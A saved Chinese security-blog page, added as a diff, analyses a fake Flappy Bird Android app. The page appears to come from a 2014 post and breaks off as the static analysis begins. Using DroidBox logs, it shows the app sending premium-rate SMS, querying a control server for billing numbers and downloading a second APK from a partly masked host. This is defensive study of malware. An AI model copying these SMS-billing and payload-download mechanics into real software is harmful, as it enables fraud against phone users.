@@ -1,0 +1,1577 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Flappy Bird 恶意程序详细分析 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="爱小狐狸的小螃蟹" /><meta name="description" content="Flappy Bird 恶意程序详细分析。Flappy Bird是在年初的时候非常火爆的一个小游戏，但是后来作者在2014年2月10日将其在Apple与Google商店下架，因为这游戏太容易让人上瘾了。这时候就有很多恶意的Flappy Bird软件在商店上冒出来。捕获到一个恶意版本的Flappy Bird可以在用户没有察觉的情况下发送短信。DroidBox 一个动态分析工具，他为我们展示了一个程序运行时具体在做什么 Android Emulator 包含在Android SDK - 用来模拟运行APK文件。dex2jar - 反编译可执行文件 (.dex/.odex) 输出 .jar 文件。JD-GUI 显示 jar 文件java源代码的GUI工具" />
+<meta name="keywords" content="Flappy Bird 恶意程序详细分析" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/4273/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="Flappy Bird 恶意程序详细分析" />
+<meta property="og:description" content="Flappy Bird 恶意程序详细分析。Flappy Bird是在年初的时候非常火爆的一个小游戏，但是后来作者在2014年2月10日将其在Apple与Google商店下架，因为这游戏太容易让人上瘾了。这时候就有很多恶意的Flappy Bird软件在商店上冒出来。捕获到一个恶意版本的Flappy Bird可以在用户没有察觉的情况下发送短信。DroidBox 一个动态分析工具，他为我们展示了一个程序运行时具体在做什么 Android Emulator 包含在Android SDK - 用来模拟运行APK文件。dex2jar - 反编译可执行文件 (.dex/.odex) 输出 .jar 文件。JD-GUI 显示 jar 文件java源代码的GUI工具" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/4273/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2014-04-05T10:36:01&#43;08:00" />
+<meta property="article:modified_time" content="2014-04-05T10:36:01&#43;08:00" />
+
+<meta itemprop="name" content="Flappy Bird 恶意程序详细分析">
+<meta itemprop="description" content="Flappy Bird 恶意程序详细分析。Flappy Bird是在年初的时候非常火爆的一个小游戏，但是后来作者在2014年2月10日将其在Apple与Google商店下架，因为这游戏太容易让人上瘾了。这时候就有很多恶意的Flappy Bird软件在商店上冒出来。捕获到一个恶意版本的Flappy Bird可以在用户没有察觉的情况下发送短信。DroidBox 一个动态分析工具，他为我们展示了一个程序运行时具体在做什么 Android Emulator 包含在Android SDK - 用来模拟运行APK文件。dex2jar - 反编译可执行文件 (.dex/.odex) 输出 .jar 文件。JD-GUI 显示 jar 文件java源代码的GUI工具"><meta itemprop="datePublished" content="2014-04-05T10:36:01&#43;08:00" />
+<meta itemprop="dateModified" content="2014-04-05T10:36:01&#43;08:00" />
+<meta itemprop="wordCount" content="5083">
+<meta itemprop="keywords" content="app,程序,恶意,分析,Android,Cmd,exe,Google,HTTP,IDS,IE,IP,Linux,NDS,Net,Rat,URL,代码,短信,工具,号码,解码,免费,模拟,软件,数据,网站,文件,问题,隐藏,游戏," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Flappy Bird 恶意程序详细分析"/>
+<meta name="twitter:description" content="Flappy Bird 恶意程序详细分析。Flappy Bird是在年初的时候非常火爆的一个小游戏，但是后来作者在2014年2月10日将其在Apple与Google商店下架，因为这游戏太容易让人上瘾了。这时候就有很多恶意的Flappy Bird软件在商店上冒出来。捕获到一个恶意版本的Flappy Bird可以在用户没有察觉的情况下发送短信。DroidBox 一个动态分析工具，他为我们展示了一个程序运行时具体在做什么 Android Emulator 包含在Android SDK - 用来模拟运行APK文件。dex2jar - 反编译可执行文件 (.dex/.odex) 输出 .jar 文件。JD-GUI 显示 jar 文件java源代码的GUI工具"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">Flappy Bird 恶意程序详细分析</h1>
+      
+      <div class="post-meta">
+        <time datetime="2014-04-05" class="post-time">
+          2014-04-05
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/app/"> app </a>
+            <a href="https://lcx.cc/categories/%E7%A8%8B%E5%BA%8F/"> 程序 </a>
+            <a href="https://lcx.cc/categories/%E6%81%B6%E6%84%8F/"> 恶意 </a>
+            <a href="https://lcx.cc/categories/%E5%88%86%E6%9E%90/"> 分析 </a>
+            
+          </div>
+        <span class="more-meta"> 约 5083 字 </span>
+          <span class="more-meta"> 预计阅读 11 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p>
+	<strong>0x00 背景</strong> 
+</p>
+<p style="text-indent:2em;">
+	Flappy Bird是在年初的时候非常火爆的一个小游戏，但是后来作者在2014年2月10日将其在Apple与Google商店下架，因为这游戏太容易让人上瘾了。
+</p>
+<p style="text-indent:2em;">
+	这时候就有很多恶意的Flappy Bird软件在商店上冒出来。
+</p>
+<p style="text-indent:2em;">
+	捕获到一个恶意版本的Flappy Bird可以在用户没有察觉的情况下发送短信。
+</p>
+<p style="text-indent:2em;">
+	App MD5：6c357ac34d061c97e6237ce9bd1fe003
+</p>
+<p style="text-indent:2em;">
+	所使用的工具：
+</p>
+<p style="text-indent:2em;">
+	<a href="https://code.google.com/p/droidbox/" target="_blank">DroidBox</a> 一个动态分析工具，他为我们展示了一个程序运行时具体在做什么 <a href="http://developer.android.com/tools/help/emulator.html" target="_blank">Android Emulator</a> 包含在<a href="https://developer.android.com/sdk/index.html" target="_blank">Android SDK</a> - 用来模拟运行APK文件
+</p>
+<p style="text-indent:2em;">
+	<a href="https://code.google.com/p/dex2jar/" target="_blank">dex2jar</a> - 反编译可执行文件 (.dex/.odex) 输出 .jar 文件
+</p>
+<p style="text-indent:2em;">
+	<a href="http://jd.benow.ca/#jd-gui" target="_blank">JD-GUI</a> 显示 jar 文件java源代码的GUI工具
+</p>
+<p style="text-indent:2em;">
+	本次分析分为两个部分：
+</p>
+<p style="text-indent:2em;">
+	动态分析 静态分析
+</p>
+<p style="text-indent:2em;">
+	在动态分析截断，我们会让app在模拟环境中运行，看看他访问哪些文件和网站，这个是我们在静态分析中寻找相关代码的关键。
+</p>
+<p style="text-indent:2em;">
+	在静态分析截断，我们会逆向APK文件出源代码，这让我们能从源代码中找出恶意行为发生的原因。
+</p>
+<p>
+	<strong>0x01 动态分析</strong> 
+</p>
+<p style="text-indent:2em;">
+	使用的最主要的工具就是DroidBox。
+</p>
+<p style="text-indent:2em;">
+	我在Linux Ubuntu上装了测试，没有发现什么问题。
+</p>
+<p style="text-indent:2em;">
+	安装DroidBox之前你需要安装Python包括pylab跟matplotlib库。
+</p>
+<p style="text-indent:2em;">
+	Python安装之后需要在<a href="http://developer.android.com/sdk/index.html" target="_blank">http://developer.android.com/sdk/index.html</a>下载安装Android SDK
+</p>
+<p style="text-indent:2em;">
+	在终端下输入下面两条命令来导入SDK的路径，这样我们在任何目录可以直接使用SDK相关命令。
+</p>
+<pre class="prettyprint">export PATH=$PATH:/path/to/android-sdk/tools/
+export PATH=$PATH:/path/to/android-sdk/platform-tools/</pre>
+<p style="text-indent:2em;">
+	下载最新的DroidBox：
+</p>
+<pre class="prettyprint">wget http://droidbox.googlecode.com/files/DroidBox411RC.tar.gz</pre>
+<p style="text-indent:2em;">
+	解压缩进入目录：
+</p>
+<pre class="prettyprint">tar -zxvf DroidBox411RC.tar.gz
+cd DroidBox411RC</pre>
+<p style="text-indent:2em;">
+	现在我们可以建立一个Android虚拟主机创建一个Android Nexus4的设备运行Android 4.2.1版本。
+</p>
+<pre class="prettyprint">android</pre>
+<p style="text-indent:2em;">
+	进入DroidBox目录，运行Android模拟器
+</p>
+<pre class="prettyprint">./startemu.sh &lt;AVD name&gt;</pre>
+<p style="text-indent:2em;">
+	等待启动完之后，安装运行Flappy Bird：
+</p>
+<pre class="prettyprint">./droidbox.sh flappy-bird.apk</pre>
+<p style="text-indent:2em;">
+	你将在终端看到：
+</p>
+<pre class="prettyprint"> ____                        __  ____
+/\  _`\               __    /\ \/\  _`\
+\ \ \/\ \  _ __  ___ /\_\   \_\ \ \ \L\ \   ___   __  _
+ \ \ \ \ \/\`'__\ __`\/\ \  /'_` \ \  _ &lt;' / __`\/\ \/'\
+  \ \ \_\ \ \ \/\ \L\ \ \ \/\ \L\ \ \ \L\ \ \L\ \/&gt;  &lt;/
+   \ \____/\ \_\ \____/\ \_\ \___,_\ \____/ \____//\_/\_\
+    \/___/  \/_/\/___/  \/_/\/__,_ /\/___/ \/___/ \//\/_/
+Waiting for the device...
+Installing the application flappy-bird.apk...
+Running the component com.hdc.bookmark3934/com.hdc.mlink_x5.MainActivity...
+Starting the activity com.hdc.mlink_x5.MainActivity...
+Application started
+Analyzing the application during infinite time seconds...
+    [-] Collected 13 sandbox logs (Ctrl-C to view logs)</pre>
+<p style="text-indent:2em;">
+	在虚拟窗口，你应该能看到Flappy Bird的运行，DroidBox也在记录了Flappy Bird的日志，按 Ctrl-C停止DroidBox然后查看日志。
+</p>
+<p style="text-indent:2em;">
+	DroidBox输出的日志是JSOn格式的，下面是一个其中一些日志：
+</p>
+<pre class="prettyprint lang-js">{
+  "apkName": "flappy-bird.apk",
+  "enfperm": [
+
+  ],
+  "recvnet": {
+    "2.104520797729492": {
+      "data": "485454502f312e3120323030204f4b0d0a5365727665723a206e67696e780d0a446174653a2053756e2c203136204d617220323031342031323a33323a343620474d540d0a436f6e74656e742d547970653a20746578742f68746d6c3b20636861727365",
+      "host": "210.***.***.195",
+      "type": "net read",
+      "port": "80"
+    },
+    "2.1131179332733154": {
+      "data": "0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a582d506f77657265642d42793a205048502f352e332e330d0a5365742d436f6f6b69653a205048505345535349443d753272317133646275743568656631616d6f3830626e746172323b20",
+      "host": "210.***.***.195",
+      "type": "net read",
+      "port": "80"
+    },
+    "2.1321218013763428": {
+      "data": "742d456e636f64696e670d0a436f6e74656e742d456e636f64696e673a20677a69700d0a0d0a1f8b08000000000000033337373100004a2f6ff00400000076616c69646174652c20706f73742d636865636b3d302c207072652d636865636b3d300d0a50",
+      "host": "210.***.***.195",
+      "type": "net read",
+      "port": "80"
+    },
+    "3.130279779434204": {
+      "data": "436f6e74726f6c3a206d61782d6167653d3630343830300d0a4163636570742d52616e6765733a2062797465730d0a0d0affd8ffe000104a46494600010101004800480000ffdb004300080606070605080707070909080a0c140d0c0b0b0c1912130f14",
+      "host": "210.***.***.195",
+      "type": "net read",
+      "port": "80"
+    },
+    "13.584807872772217": {
+      "data": "485454502f312e3120323030204f4b0d0a446174653a2053756e2c203136204d617220323031342031323a33323a353720474d540d0a4163636570742d52616e6765733a2062797465730d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a",
+      "host": "210.***.**.196",
+      "type": "net read",
+      "port": "80"
+    },
+    "11.968261957168579": {
+      "data": "0a0d0a504b0304140008000800374c5d38000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000ad59c992da5a12dd3bc2ffe06577285c1262925e84171ad1006840136c2a846634eb6ae4eb9b67bbbbfdca",
+      "host": "210.***.**.196",
+      "type": "net read",
+      "port": "80"
+    },
+    "2.8462908267974854": {
+      "data": "65643a205361742c2030382046656220323031342030323a31323a303020474d540d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a455461673a202235326635393237302d32326433220d0a457870697265733a2053756e2c203233204d",
+      "host": "210.***.***.195",
+      "type": "net read",
+      "port": "80"
+    },
+    "2.8404297828674316": {
+      "data": "485454502f312e3120323030204f4b0d0a5365727665723a206e67696e780d0a446174653a2053756e2c203136204d617220323031342031323a33323a343720474d540d0a436f6e74656e742d547970653a20696d6167652f6a7065670d0a436f6e7465",
+      "host": "210.***.***.195",
+      "type": "net read",
+      "port": "80"
+    },
+    "11.675630807876587": {
+      "data": "485454502f312e3120323030204f4b0d0a446174653a2053756e2c203136204d617220323031342031323a33323a353520474d540d0a4163636570742d52616e6765733a2062797465730d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a",
+      "host": "210.***.**.196",
+      "type": "net read",
+      "port": "80"
+    },
+    "11.910815000534058": {
+      "data": "30300d0a4c6173742d4d6f6469666965643a205361742c2030382046656220323031342030323a31333a313320474d540d0a436f6e74656e742d547970653a206170706c69636174696f6e2f766e642e616e64726f69642e7061636b6167652d61726368",
+      "host": "210.***.**.196",
+      "type": "net read",
+      "port": "80"
+    },
+    "14.005896806716919": {
+      "data": "0a0d0a504b0304140008000800374c5d38000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000ad59c992da5a12dd3bc2ffe06577285c1262925e84171ad1006840136c2a846634eb6ae4eb9b67bbbbfdca",
+      "host": "210.***.**.196",
+      "type": "net read",
+      "port": "80"
+    },
+    "13.692770957946777": {
+      "data": "30300d0a4c6173742d4d6f6469666965643a205361742c2030382046656220323031342030323a31333a313320474d540d0a436f6e74656e742d547970653a206170706c69636174696f6e2f766e642e616e64726f69642e7061636b6167652d61726368",
+      "host": "210.***.**.196",
+      "type": "net read",
+      "port": "80"
+    },
+    "2.1189818382263184": {
+      "data": "20313938312030383a35323a303020474d540d0a43616368652d436f6e74726f6c3a206e6f2d73746f72652c206e6f2d63616368652c206d7573742d726576616c69646174652c20706f73742d636865636b3d302c207072652d636865636b3d300d0a50",
+      "host": "210.***.***.195",
+      "type": "net read",
+      "port": "80"
+    }
+  },
+  "servicestart": {
+
+  },
+  "sendsms": {
+    "7.549656867980957": {
+      "message": "BMK BOKMA 2 12d2a43f2c03bbfbaa3a12cc65078143 3934",
+      "type": "sms",
+      "number": "7740"
+    },
+    "10.157855987548828": {
+      "message": "BMK BOKMA 2 12d2a43f2c03bbfbaa3a12cc65078143 3934",
+      "type": "sms",
+      "number": "7740"
+    }
+  },
+  "cryptousage": {
+
+  },
+  "sendnet": {
+    "1.6028339862823486": {
+      "type": "net write",
+      "desthost": "210.***.***.195",
+      "fd": "16",
+      "operation": "send",
+      "data": "474554202f626f6f6b6d61726b2f67657453657276696365436f64653f70726963653d313530303020485454502f312e310d0a557365722d4167656e743a2044616c76696b2f312e362e3020284c696e75783b20553b20416e64726f696420342e312e31",
+      "destport": "80"
+    },
+    "2.5497188568115234": {
+      "type": "net write",
+      "desthost": "210.***.***.195",
+      "fd": "19",
+      "operation": "send",
+      "data": "474554202f75706c6f61642f626f6f6b6d61726b2f323031342f303230382f666c617070795f312e6a706720485454502f312e310d0a557365722d4167656e743a2044616c76696b2f312e362e3020284c696e75783b20553b20416e64726f696420342e",
+      "destport": "80"
+    },
+    "11.307919979095459": {
+      "type": "net write",
+      "desthost": "210.***.**.196",
+      "fd": "26",
+      "operation": "send",
+      "data": "474554202f6170702f666c617070792e61706b20485454502f312e310d0a557365722d4167656e743a2044616c76696b2f312e362e3020284c696e75783b20553b20416e64726f696420342e312e313b2046756c6c20416e64726f6964206f6e20456d75",
+      "destport": "80"
+    },
+    "13.101272821426392": {
+      "type": "net write",
+      "desthost": "210.***.**.196",
+      "fd": "28",
+      "operation": "send",
+      "data": "474554202f6170702f666c617070792e61706b20485454502f312e310d0a557365722d4167656e743a2044616c76696b2f312e362e3020284c696e75783b20553b20416e64726f696420342e312e313b2046756c6c20416e64726f6964206f6e20456d75",
+      "destport": "80"
+    }
+  },
+  "accessedfiles": {
+    "1033683943": "/proc/1188/cmdline",
+    "1067199142": "/data/data/com.hdc.bookmark3934/app_mytime/checktime.txt",
+    "1325730693": "/proc/1163/cmdline",
+    "839394932": "/proc/1174/cmdline"
+  },
+  "fdaccess": {
+    "4.386643886566162": {
+      "path": "/proc/1163/cmdline",
+      "operation": "read",
+      "data": "636f6d2e6864632e626f6f6b6d61726b333933340000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000702f666c617070792d626972642e61706b00707079626972",
+      "id": "1325730693",
+      "type": "file read"
+    },
+    "4.41674280166626": {
+      "path": "/proc/1174/cmdline",
+      "operation": "read",
+      "data": "6c6f676361740044726f6964426f783a570064616c76696b766d3a570041637469766974794d616e616765723a49000000000000000000000000000000000000000000000000000000000000702f666c617070792d626972642e61706b00707079626972",
+      "id": "839394932",
+      "type": "file read"
+    },
+    "15.97931981086731": {
+      "path": "/proc/1188/cmdline",
+      "operation": "read",
+      "data": "636f6d2e616e64726f69642e7061636b616765696e7374616c6c6572000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000702f666c617070792d626972642e61706b00707079626972",
+      "id": "1033683943",
+      "type": "file read"
+    },
+    "10.113840818405151": {
+      "path": "/data/data/com.hdc.bookmark3934/app_mytime/checktime.txt",
+      "operation": "write",
+      "data": "00086d6c696e6b5f7835",
+      "id": "1067199142",
+      "type": "file write"
+    }
+  },
+  "dataleaks": {
+
+  },
+  "opennet": {
+    "1.300102949142456": {
+      "desthost": "210.***.***.195",
+      "fd": "16",
+      "destport": "80"
+    },
+    "2.210848808288574": {
+      "desthost": "210.***.***.195",
+      "fd": "19",
+      "destport": "80"
+    },
+    "12.578583002090454": {
+      "desthost": "210.***.**.196",
+      "fd": "28",
+      "destport": "80"
+    },
+    "10.951124906539917": {
+      "desthost": "210.***.**.196",
+      "fd": "26",
+      "destport": "80"
+    }
+  },
+  "recvsaction": {
+    "vn.adflex.sdk.AdFlexBootUpReceiver": "android.intent.action.PACKAGE_RESTARTED"
+  },
+  "dexclass": {
+    "0.32921576499938965": {
+      "path": "/data/app/com.hdc.bookmark3934-1.apk",
+      "type": "dexload"
+    },
+    "15.300875902175903": {
+      "path": "/system/app/PackageInstaller.apk",
+      "type": "dexload"
+    }
+  },
+  "hashes": [
+    "6c357ac34d061c97e6237ce9bd1fe003",
+    "79e911f1b3c0f1ccd2012832b92fdff548d54b3f",
+    "5782758e98698dbcfa1821a56d4501c73efeeec7425dd5aa129e386542666cd5"
+  ],
+  "closenet": {
+
+  },
+  "phonecalls": {
+
+  }
+}</pre>
+<p style="text-indent:2em;">
+	隐藏了部分敏感信息，日志其中最明显的是发送了两条短信。
+</p>
+<pre class="prettyprint lang-js">  "sendsms": {
+    "7.549656867980957": {
+      "message": "BMK BOKMA 2 12d2a43f2c03bbfbaa3a12cc65078143 3934",
+      "type": "sms",
+      "number": "7740"
+    },
+    "10.157855987548828": {
+      "message": "BMK BOKMA 2 12d2a43f2c03bbfbaa3a12cc65078143 3934",
+      "type": "sms",
+      "number": "7740"</pre>
+<p style="text-indent:2em;">
+	把BMK BOKMA 2 12d2a43f2c03bbfbaa3a12cc65078143 3934发送到号码7740那里。
+</p>
+<p style="text-indent:2em;">
+	根据下面的日志可以得出：
+</p>
+<pre class="prettyprint lang-js">"sendnet": {
+    "1.6028339862823486": {
+      "type": "net write",
+      "desthost": "210.***.***.195",
+      "fd": "16",
+      "operation": "send",
+      "data": "474554202f626f6f6b6d61726b2f67657453657276696365436f64653f70726963653d313530303020485454502f312e310d0a557365722d4167656e743a2044616c76696b2f312e362e3020284c696e75783b20553b20416e64726f696420342e312e31",
+      "destport": "80"
+    }</pre>
+<p style="text-indent:2em;">
+	该app访问了210.<strong><em>.</em></strong>.195这个ip，发送了如下数据：
+</p>
+<p style="text-indent:2em;">
+	474554202f626f6f6b6d61726b2f67657453657276696365436f64653f70726963653d313530303020485454502f312e310d0a557365722d4167656e743a2044616c76696b2f312e362e3020284c696e75783b20553b20416e64726f696420342e312e31
+</p>
+<p style="text-indent:2em;">
+	数据是16进制编码的，转为ASCII：
+</p>
+<pre class="prettyprint">GET /bookmark/getServiceCode?price=15000 HTTP/1.1
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1</pre>
+<p style="text-indent:2em;">
+	所以这个app访问URL http://210.<strong><em>.</em></strong>.195/bookmark/getServiceCode?price=15000，那么返回值是什么呢？返回值为<strong>7740</strong>，也就是发送短信过去的号码。
+</p>
+<p style="text-indent:2em;">
+	尝试了一下修改不容的price的值，返回的结果不同：
+</p>
+<pre class="prettyprint">price=20000 returns 7040
+price=30000 returns 7040
+price=10000 returns 7640
+price=5000 returns 7540
+price=1000 returns 7040</pre>
+<p style="text-indent:2em;">
+	根据波兰网站<a href="http://www.ilekosztujesms.pl/07540/" target="_blank">http://www.ilekosztujesms.pl/07540/</a>显示，往该号码发送短信将花费5波兰罗提（差不多相当于10人民币）。
+</p>
+<p style="text-indent:2em;">
+	还有个奇怪的东西：
+</p>
+<pre class="prettyprint lang-js">"2.5497188568115234": {
+      "type": "net write",
+      "desthost": "210.***.***.195",
+      "fd": "19",
+      "operation": "send",
+      "data": "474554202f75706c6f61642f626f6f6b6d61726b2f323031342f303230382f666c617070795f312e6a706720485454502f312e310d0a557365722d4167656e743a2044616c76696b2f312e362e3020284c696e75783b20553b20416e64726f696420342e",
+      "destport": "80"
+    }</pre>
+<p style="text-indent:2em;">
+	解码出来之后看到数据包为：
+</p>
+<pre class="prettyprint">GET /upload/bookmark/2014/0208/flappy_1.jpg HTTP/1.1
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.</pre>
+<p style="text-indent:2em;">
+	这个我们稍后在静待分析阶段分析。
+</p>
+<p style="text-indent:2em;">
+	总结：我们现在知道了Flappy Bird连接到哪些网站，给付费号码发送短信，并且可以根据接口返回不同发向不同的付费号码。因此可以推测，这个恶意app通过此来赚钱。
+</p>
+<p style="text-indent:2em;">
+	但是210.*<strong>.</strong>.196这个IP是做什么的呢？
+</p>
+<pre class="prettyprint lang-js">"11.307919979095459": {
+      "type": "net write",
+      "desthost": "210.***.**.196",
+      "fd": "26",
+      "operation": "send",
+      "data": "474554202f6170702f666c617070792e61706b20485454502f312e310d0a557365722d4167656e743a2044616c76696b2f312e362e3020284c696e75783b20553b20416e64726f696420342e312e313b2046756c6c20416e64726f6964206f6e20456d75",
+      "destport": "80"
+    }</pre>
+<p style="text-indent:2em;">
+	解码后显示访问地址为
+</p>
+<pre class="prettyprint">http://210.***.**.196/app/flappy.apk</pre>
+<p style="text-indent:2em;">
+	上面数据表明，改程序正在下载另一个APK：flappy.apk。
+</p>
+<p style="text-indent:2em;">
+	或许我们的Flappy Bird只是一个下载者。
+</p>
+<p style="text-indent:2em;">
+	这样我们就知道app做了什么了：
+</p>
+<ol>
+	<li>
+		发送短信扣费。
+	</li>
+	<li>
+		下载其他的Flappy Bird。
+	</li>
+</ol>
+<p style="text-indent:2em;">
+	根据这些信息，我们来静态分析定位其中相关的源代码。
+</p>
+<p>
+	<strong>0x02 静态分析</strong> 
+</p>
+<p style="text-indent:2em;">
+	静态分析需要两个工具，<a href="https://code.google.com/p/dex2jar/" target="_blank">dex2jar</a>和<a href="http://jd.benow.ca/#jd-gui" target="_blank">JD-GUI</a>。
+</p>
+<p style="text-indent:2em;">
+	第一步就是把APK文件反编译为Java代码。
+</p>
+<p style="text-indent:2em;">
+	开始之前我们来看一下APK文件的解构：
+</p>
+<p style="text-indent:2em;">
+	META-INF: 文件夹 lib: 编译后的代码目录 res: APK所需要的资源文件夹 assets: 应用程序资源目录 AndroidManifest.xml: 一个传统的Android清单文件，用于描述该应用程序的名字、版本号、所需权限、注册的服务、链接的其他应用程序。 classes.dex: classes文件通过DEX编译后的文件格式，用于在Dalvik虚拟机上运行的主要代码部分。 resources.arsc: 预编译文件
+</p>
+<p style="text-indent:2em;">
+	所以我们最感兴趣的文件为<strong>classes.dex</strong>，我们希望把classes.dex文件转为jar文件，这可以通过dex2jar来完成：
+</p>
+<p style="text-indent:2em;">
+	先从<a href="http://code.google.com/p/dex2jar/downloads/list" target="_blank">http://code.google.com/p/dex2jar/downloads/list</a>下载解压dex2jar。
+</p>
+<pre class="prettyprint">unzip -x dex2jar-version.zip -d /home/user/dex2jar</pre>
+<p style="text-indent:2em;">
+	一旦解压之后，就可以使用反编译APK文件了：
+</p>
